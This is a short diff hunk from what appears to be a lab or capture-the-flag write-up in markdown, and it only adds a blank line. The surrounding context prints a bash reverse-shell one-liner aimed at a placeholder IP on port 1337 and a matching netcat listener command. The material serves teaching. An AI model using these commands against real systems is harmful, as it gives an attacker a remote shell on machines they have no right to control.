@@ -92,6 +92,7 @@ _Let's get a reverse shell by creating a new file shell.sh containing the follow
 which will connect back to our local machine on port 1337 ._
 
 **#!/bin/bash**
+
 **bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1**
 
 _will start net cat listener by command **nc -nvlp 1337**_
